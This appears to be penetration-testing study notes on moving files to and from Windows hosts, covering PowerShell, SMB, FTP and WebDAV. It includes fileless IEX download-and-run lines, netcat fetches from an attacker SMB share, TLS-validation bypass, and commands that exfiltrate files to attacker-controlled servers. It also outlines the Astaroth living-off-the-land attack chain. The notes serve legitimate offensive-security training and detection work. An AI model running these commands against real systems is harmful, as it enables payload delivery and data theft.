# 🪟 Windows File Transfer Methods

## Introduction

The Windows OS has evolved to include various built-in utilities for file transfer.  
Understanding these methods benefits both **attackers** (for stealth operations) and **defenders** (for detection and policy creation).

### Example: Microsoft Astaroth Attack (APT)
1. **Initial Access:** Spear-phishing email with malicious `.lnk` file.  
2. **Execution:** `.lnk` triggers `WMIC /Format` → downloads malicious JavaScript.  
3. **Payload Retrieval:** JavaScript abuses `Bitsadmin` to download base64 payloads.  
4. **Decoding & Loading:** `Certutil` decodes → `regsvr32` loads DLLs.  
5. **Injection:** Final payload (Astaroth) injected into `Userinit`.

> 🧠 Demonstrates multiple native Windows tools chained together to evade detection.

---

## Download Operations

### 1. PowerShell Base64 Encode/Decode

**Scenario:** Transfer small files (no network traffic).

**Steps (Linux → Windows):**
```bash
# On Pwnbox (Linux)
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

```powershell
# On Windows (Decode)
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<b64string>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

> ⚠️ Limitation: `cmd.exe` max string length = **8191 chars**.

---

### 2. PowerShell Web Downloads

Most orgs allow **HTTP/HTTPS**, making them ideal for file transfers.

#### Common Methods (via `System.Net.WebClient`)
| Method | Description |
|--------|--------------|
| `OpenRead` | Returns data as stream |
| `DownloadFile` | Saves file locally |
| `DownloadString` | Returns string (useful for fileless ops) |
| Async versions | Don’t block execution |

**Examples:**
```powershell
# Download to disk
(New-Object Net.WebClient).DownloadFile('https://url/file.ps1','C:\path\file.ps1')

# Fileless execution
IEX (New-Object Net.WebClient).DownloadString('https://url/script.ps1')
```

**Alternative Cmdlet:**
```powershell
Invoke-WebRequest https://url/script.ps1 -OutFile script.ps1
```

> 💡 Aliases: `iwr`, `curl`, `wget`

#### Common Errors
- **IE parsing error:** use `-UseBasicParsing`
- **SSL/TLS trust issues:**
  ```powershell
  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  ```

---

### 3. SMB Downloads

Use **Impacket’s `smbserver.py`** to host files:
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

**Download from Windows:**
```cmd
copy \\<attacker_ip>\share\nc.exe
```

**If guest access is blocked:**
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
net use n: \\<ip>\share /user:test test
copy n:\nc.exe
```

---

### 4. FTP Downloads

**Setup FTP Server (Python):**
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

**PowerShell download:**
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt','C:\file.txt')
```

**Non-interactive download (cmd):**
```cmd
echo open <ip> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Upload Operations

### 1. PowerShell Base64 Encode

```powershell
[Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\System32\drivers\etc\hosts" -Algorithm MD5
```

**Decode on Linux:**
```bash
echo "<base64>" | base64 -d > hosts
md5sum hosts
```

---

### 2. PowerShell Web Upload

**Install upload-enabled server (Python):**
```bash
pip3 install uploadserver
python3 -m uploadserver
# Uploads available at http://<ip>:8000/upload
```

**PowerShell upload script:**
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ip>:8000/upload -File C:\path\file.txt
```

---

### 3. PowerShell Base64 Web Upload (POST + Netcat)

```powershell
$b64 = [Convert]::ToBase64String((Get-Content 'C:\file.txt' -Encoding Byte))
Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
```

**Catch and decode:**
```bash
nc -lvnp 8000
echo "<b64>" | base64 -d > file.txt
```

---

### 4. SMB Uploads (via WebDAV)

If SMB (TCP/445) blocked → use **WebDAV (HTTP/80 or HTTPS/443)**.

**Install server:**
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Connect from Windows:**
```cmd
dir \\<ip>\DavWWWRoot
copy C:\file.zip \\<ip>\DavWWWRoot\
```

> `DavWWWRoot` is a Windows keyword for WebDAV root path.

---

### 5. FTP Uploads

**Start write-enabled FTP Server:**
```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**PowerShell Upload:**
```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts','C:\path\hosts')
```

**Non-interactive Upload:**
```cmd
echo open <ip> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\path\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Recap

| Method | Direction | Protocol | Notes |
|--------|------------|-----------|-------|
| Base64 Encode/Decode | Upload & Download | None | Useful for small files |
| PowerShell Web (HTTP/S) | Both | 80/443 | File or fileless ops |
| SMB | Both | 445 | May require authentication |
| FTP | Both | 21/20 | Simple; may need scripting |
| WebDAV | Both | 80/443 | SMB alternative via HTTP |

---

## Next Steps / Options

- Add **collapsible code blocks** for GitHub/Obsidian compatibility.
- Add **syntax highlighting** in code blocks where helpful.
- Produce an **HTML** or **PDF** export for printing or sharing.

If you want any of the above, tell me which format and I’ll export it.

---
